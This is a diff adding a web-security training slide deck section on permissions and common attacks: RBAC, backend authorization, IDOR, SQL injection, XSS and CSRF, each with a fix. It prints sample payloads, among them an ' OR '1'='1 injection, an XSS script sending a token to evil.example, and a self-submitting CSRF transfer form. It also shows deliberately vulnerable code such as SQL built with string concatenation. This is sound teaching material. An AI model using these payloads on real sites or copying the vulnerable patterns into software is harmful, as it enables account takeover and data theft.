@@ -1,8 +1,259 @@
 <!-- ============ 04 · PERMISSIONS &AMP; COMMON ATTACKS ============ -->
+<style>
+/* section 4 only: every selector is prefixed .s4- */
+.s4-col { display: flex; flex-direction: column; gap: 14px; min-width: 0; }
+.s4-col .code { font-size: 15px; line-height: 1.5; padding: 12px 16px; }
+.s4-col .code-label { margin-bottom: -6px; }
+.s4-two { flex: 1; min-height: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 36px; align-items: start; }
+.s4-two.wide-left { grid-template-columns: 7fr 5fr; }
+.s4-chain { display: flex; align-items: center; gap: 10px; font-size: 18px; color: var(--muted); }
+.s4-tbl td { text-align: center; font-family: var(--mono); font-size: 20px; }
+.s4-tbl th { text-align: center; }
+.s4-tbl td:first-child, .s4-tbl th:first-child { text-align: left; }
+.s4-tbl .s4-yes { color: var(--allow); font-weight: 700; }
+.s4-tbl .s4-no { color: var(--muted-soft); }
+.code .s4-bad { background: var(--reject-wash); color: var(--reject); border-radius: 4px; padding: 1px 2px; }
+.code .s4-ok { color: var(--allow); font-weight: 600; }
+.s4-ui { display: flex; flex-direction: column; gap: 10px; padding: 14px 18px; border: 1px solid var(--panel-border); border-radius: var(--r-md); background: var(--surface-alt); }
+.s4-ui-row { display: flex; align-items: center; gap: 10px; font-size: 18px; color: var(--ink); }
+.s4-ui-row .s4-grow { flex: 1; font-family: var(--mono); font-size: 16px; }
+.s4-btn { font-family: var(--sans); font-size: 15px; font-weight: 600; padding: 6px 14px; border-radius: var(--r-sm); border: 1px solid var(--hairline); background: var(--surface); color: var(--body); }
+.s4-btn.s4-ghost { border-style: dashed; color: var(--muted-soft); background: transparent; text-decoration: line-through; }
+.s4-ui-cap { font-family: var(--mono); font-size: 13.5px; color: var(--muted); }
+.s4-checklist { flex: 1; min-height: 0; display: grid; grid-template-columns: 1fr 1fr; gap: 0 40px; align-content: start; }
+.s4-checklist .points li { font-size: 18px; padding: 10px 0; }
+.s4-checklist .points li:first-child { border-top: 0; padding-top: 0; }
+.s4-checklist .chip { min-width: 74px; justify-content: center; }
+</style>
 <section class="slide divider" data-section="divider-04">
   <div class="divider-num">04</div>
   <div class="section-tag"><i></i>SECTION 4</div>
   <h2>Permissions &amp; common attacks</h2>
   <p class="lead">Who can do what, and the four bugs that let attackers skip the check.</p>
   <div class="foot"><span>7 / 9</span><span>section 4 · authz &amp; attacks</span></div>
+</section>
+
+<!-- 4.1 RBAC -->
+<section class="slide" data-section="authz-rbac">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-users"/></svg>4.1 · Roles and permissions (RBAC)</div>
+  <h2>Your code should ask "may this user delete orders?", never "is this user an admin?"</h2>
+  <div class="s4-two">
+    <div class="s4-col">
+      <div class="s4-chain"><span class="chip">user</span>has a<span class="chip hot">role</span>which grants<span class="chip hot">permissions</span></div>
+      <table class="tbl s4-tbl">
+        <thead><tr><th>role</th><th>orders:read</th><th>orders:write</th><th>orders:delete</th></tr></thead>
+        <tbody>
+          <tr><td class="name">viewer</td><td class="s4-yes">✓</td><td class="s4-no">—</td><td class="s4-no">—</td></tr>
+          <tr><td class="name">editor</td><td class="s4-yes">✓</td><td class="s4-yes">✓</td><td class="s4-no">—</td></tr>
+          <tr><td class="name">admin</td><td class="s4-yes">✓</td><td class="s4-yes">✓</td><td class="s4-yes">✓</td></tr>
+        </tbody>
+      </table>
+      <ul class="points tight">
+        <li>RBAC = Role-Based Access Control. A user gets a role; the role is just a named list of permissions.</li>
+        <li>The table lives in one place (config or a DB table), not spread across handlers.</li>
+      </ul>
+    </div>
+    <div class="s4-col">
+      <div class="code-label">checks a role name</div>
+<pre class="code"><span class="c">// every new role means editing every if</span>
+if (user.role === <span class="s4-bad">"admin"</span>) {
+  deleteOrder(id);
+}</pre>
+      <div class="code-label" data-step="1">checks a permission</div>
+<pre class="code" data-step="1"><span class="c">// can() looks the role up in the table</span>
+if (can(user, <span class="hl">"orders:delete"</span>)) {
+  deleteOrder(id);
+}</pre>
+      <ul class="points tight">
+        <li data-step="2"><span class="chip ok">why</span>Tomorrow you add a <code>support</code> role that may delete. You change one row in the table, not 40 <code>if</code> statements.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.2 Hiding the button is not authorization -->
+<section class="slide" data-section="authz-hidden-button">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-shield"/></svg>4.2 · Hiding a button is not a permission check</div>
+  <h2>The frontend hid the Delete button. Anyone with curl can still call the API.</h2>
+  <div class="s4-two wide-left">
+    <div class="s4-col">
+      <div class="code-label">what a viewer sees</div>
+      <div class="s4-ui">
+        <div class="s4-ui-row"><span class="s4-grow">Order #1024 · 420.000 ₫</span><span class="s4-btn">View</span><span class="s4-btn s4-ghost">Delete</span></div>
+        <div class="s4-ui-cap">{user.role === "admin" &amp;&amp; &lt;DeleteButton /&gt;}</div>
+      </div>
+      <div class="code-label" data-step="1">what an attacker types instead</div>
+<pre class="code" data-step="1">$ curl -X DELETE https://api.shop.example/orders/1024 \
+    -H "Cookie: sid=&lt;the viewer's own session&gt;"
+
+HTTP/1.1 <span class="s4-bad">204 No Content</span>   <span class="c">// deleted</span></pre>
+      <div class="code-label" data-step="2">the fix lives on the server</div>
+<pre class="code" data-step="2">app.delete("/orders/:id",
+  requirePermission(<span class="hl">"orders:delete"</span>), deleteOrder);
+
+HTTP/1.1 <span class="s4-ok">403 Forbidden</span></pre>
+    </div>
+    <ul class="points tight">
+      <li>The browser is the user's machine. They can open DevTools, edit the page, or skip it and use curl or Postman.</li>
+      <li data-step="1"><span class="chip risk">bug</span>The API trusted the UI to do the check. Nothing on the server asked "may this user delete?"</li>
+      <li data-step="2"><span class="chip ok">rule</span>Hiding buttons is for a nice UI. Every permission check must also run on the backend, on every request.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.3 Broken access control / IDOR -->
+<section class="slide" data-section="authz-idor">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-search"/></svg>4.3 · Broken access control</div>
+  <h2>"Logged in" is not "allowed": check that the row belongs to this user</h2>
+  <div class="s4-two wide-left">
+    <div class="s4-col">
+      <div class="code-label">An opens her own order</div>
+<pre class="code">GET /orders/1024        Cookie: sid=<span class="c">&lt;An&gt;</span>
+→ 200 { "id": 1024, "owner": "an", "total": 420000 }</pre>
+      <div class="code-label" data-step="1">An changes one digit in the URL</div>
+<pre class="code" data-step="1">GET /orders/<span class="s4-bad">1025</span>        Cookie: sid=<span class="c">&lt;An&gt;</span>
+→ 200 { "id": 1025, "owner": <span class="s4-bad">"binh"</span>, "address": "…" }</pre>
+      <div class="code-label" data-step="2">fix: the query includes the owner</div>
+<pre class="code" data-step="2">db.query(
+  "SELECT * FROM orders WHERE id = ? <span class="hl">AND user_id = ?</span>",
+  [req.params.id, <span class="hl">req.user.id</span>]
+);
+<span class="c">// no row → 404, same as an order that doesn't exist</span></pre>
+    </div>
+    <ul class="points tight">
+      <li>The endpoint checked "is there a valid session?" and stopped. Any logged-in user can read any order.</li>
+      <li data-step="1"><span class="chip risk">IDOR</span>Insecure Direct Object Reference: the ID in the URL is the only lock. It is #1 on the OWASP Top 10 list of web risks.</li>
+      <li data-step="2"><span class="chip ok">fix</span>Always ask "does this row belong to this user?" in the query itself. Take the user from the session, never from the request body.</li>
+      <li data-step="2">Random IDs (UUIDs) make guessing harder, but they are not the fix. IDs leak in logs and links.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.4 SQL injection -->
+<section class="slide" data-section="authz-sql-injection">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-bug"/></svg>4.4 · SQL injection</div>
+  <h2>Glue user input into a SQL string and the input becomes part of your query</h2>
+  <div class="s4-two">
+    <div class="s4-col">
+      <div class="code-label">setup · the login handler builds SQL with +</div>
+<pre class="code"><span class="c">// POST /login  (also plaintext passwords: 2 bugs)</span>
+const sql =
+  "SELECT * FROM users WHERE email = '" + email +
+  "' AND password = '" + password + "'";</pre>
+      <div class="code-label" data-step="1">attack · typed into the password box</div>
+<pre class="code" data-step="1"><span class="s4-bad">' OR '1'='1</span></pre>
+      <div class="code-label" data-step="2">the SQL the database actually runs</div>
+<pre class="code" data-step="2">SELECT * FROM users
+WHERE email = 'an@shop.example'
+  AND password = '<span class="s4-bad">' OR '1'='1</span>'</pre>
+    </div>
+    <div class="s4-col">
+      <ul class="points tight">
+        <li data-step="2"><span class="chip risk">result</span><code>'1'='1'</code> is true for every row, so the query returns all users. The app logs you in as the first one, often the admin.</li>
+      </ul>
+      <div class="code-label" data-step="3">fix · placeholders, never +</div>
+<pre class="code" data-step="3">const user = await db.query(
+  "SELECT * FROM users WHERE email = <span class="hl">?</span>",
+  [email]
+);
+<span class="c">// then: bcrypt.compare(password, user.password_hash)</span></pre>
+      <ul class="points tight">
+        <li data-step="3"><span class="chip ok">why</span>The value travels separately from the SQL. The database treats it as data, never as code.</li>
+        <li data-step="3">ORMs do this for you. Watch for <code>raw()</code> and template strings that glue values in.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.5 XSS -->
+<section class="slide" data-section="authz-xss">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-bug"/></svg>4.5 · Cross-site scripting (XSS)</div>
+  <h2>If the page renders user text as HTML, an attacker's script runs in every reader's browser</h2>
+  <div class="s4-two">
+    <div class="s4-col">
+      <div class="code-label">setup · Mallory posts a comment</div>
+<pre class="code">Nice shoes! <span class="s4-bad">&lt;script&gt;</span>
+  fetch("https://evil.example/?t=" +
+        <span class="s4-bad">localStorage.token</span>)
+<span class="s4-bad">&lt;/script&gt;</span></pre>
+      <div class="code-label" data-step="1">attack · the page inserts it as HTML</div>
+<pre class="code" data-step="1">commentEl.<span class="s4-bad">innerHTML</span> = comment.text;</pre>
+      <ul class="points tight">
+        <li data-step="1"><span class="chip risk">result</span>Every visitor who opens the page runs Mallory's script. Their token goes to <code>evil.example</code>, and she is now logged in as them.</li>
+      </ul>
+    </div>
+    <div class="s4-col">
+      <div class="code-label" data-step="2">fix · let the framework escape it</div>
+<pre class="code" data-step="2"><span class="c">// React {} prints text, the script shows as characters</span>
+&lt;p&gt;<span class="hl">{comment.text}</span>&lt;/p&gt;
+
+<span class="c">// avoid with user text (or sanitize first)</span>
+<span class="s4-bad">dangerouslySetInnerHTML</span>   <span class="s4-bad">innerHTML</span></pre>
+      <ul class="points tight">
+        <li data-step="2"><span class="chip ok">1</span>Escaping turns <code>&lt;</code> into <code>&amp;lt;</code>, so the browser shows the tag instead of running it. React, Vue and Angular do it by default.</li>
+        <li data-step="3"><span class="chip ok">2</span>Keep the token in an <code>HttpOnly</code> cookie (slide 2.8). Even if a script runs, JavaScript cannot read the cookie.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.6 CSRF -->
+<section class="slide" data-section="authz-csrf">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-cookie"/></svg>4.6 · Cross-site request forgery (CSRF)</div>
+  <h2>The browser attaches your cookie to any request, even one that another site started</h2>
+  <div class="s4-two">
+    <div class="s4-col">
+      <div class="code-label" data-step="1">attack · evil.example/win-a-prize.html</div>
+<pre class="code" data-step="1">&lt;form action="https://bank.example/transfer"
+      method="POST" hidden&gt;
+  &lt;input name="to" value="attacker"&gt;
+  &lt;input name="amount" value="5000000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</pre>
+      <div class="code-label" data-step="2">what bank.example receives</div>
+<pre class="code" data-step="2">POST /transfer HTTP/1.1
+Host: bank.example
+<span class="s4-bad">Cookie: sid=7f3a…</span>   <span class="c">// added by the browser</span>
+
+to=attacker&amp;amount=5000000</pre>
+    </div>
+    <div class="s4-col">
+      <ul class="points tight">
+        <li><span class="chip">setup</span>You are logged in to <code>bank.example</code> in one tab. Its session cookie sits in your browser.</li>
+        <li data-step="1">You open a link to <code>evil.example</code>. The hidden form submits itself the moment the page loads.</li>
+        <li data-step="2"><span class="chip risk">result</span>The request carries your real cookie. To the bank it looks exactly like you clicked "Transfer".</li>
+        <li data-step="3"><span class="chip ok">fix</span><code>SameSite=Lax</code> (or <code>Strict</code>) on the cookie: the browser stops sending it on cross-site POSTs. Add a CSRF token to forms: a random value the evil page cannot know.</li>
+        <li data-step="4"><span class="chip hot">trade-off</span>A token sent in the <code>Authorization</code> header is never attached by the browser, so no CSRF. But JavaScript must read it, so XSS can steal it. There is no free choice.</li>
+      </ul>
+    </div>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
+</section>
+
+<!-- 4.7 Take-home checklist -->
+<section class="slide" data-section="authz-checklist">
+  <div class="eyebrow"><svg class="ic"><use href="#ic-lock"/></svg>4.7 · Take-home checklist</div>
+  <h2>Ten things to check before you open a pull request that touches login or data</h2>
+  <div class="s4-checklist">
+    <ul class="points">
+      <li><span class="chip">password</span>Hash with <code>bcrypt</code> or <code>argon2</code> from a library. Never store, log or return the password.</li>
+      <li><span class="chip">password</span>Failed login says "Wrong email or password". Never reveal which one was wrong.</li>
+      <li><span class="chip">token</span>Store tokens in <code>HttpOnly; Secure; SameSite</code> cookies, not <code>localStorage</code>.</li>
+      <li><span class="chip">token</span>Verify every JWT with a library and a fixed algorithm. Nothing secret in the payload.</li>
+      <li><span class="chip">token</span>Short access tokens (15 min). Logout deletes the refresh token on the server.</li>
+    </ul>
+    <ul class="points">
+      <li><span class="chip">oauth</span><code>client_secret</code> only on the backend, from env or a secret manager. Ask for the smallest scope.</li>
+      <li><span class="chip">authz</span>Check permissions on the backend, on every request. Check the permission, not the role name.</li>
+      <li><span class="chip">authz</span>Check ownership in the query: <code>WHERE id = ? AND user_id = ?</code>.</li>
+      <li><span class="chip">attack</span>Use <code>?</code> placeholders or the ORM. Never build SQL with <code>+</code>.</li>
+      <li><span class="chip">attack</span>Let the framework escape output, no <code>innerHTML</code> with user text. Cookie forms get <code>SameSite</code> + a CSRF token.</li>
+    </ul>
+  </div>
+  <div class="foot"><span>0 / 0</span><span>section 4 · permissions &amp; attacks</span></div>
 </section>
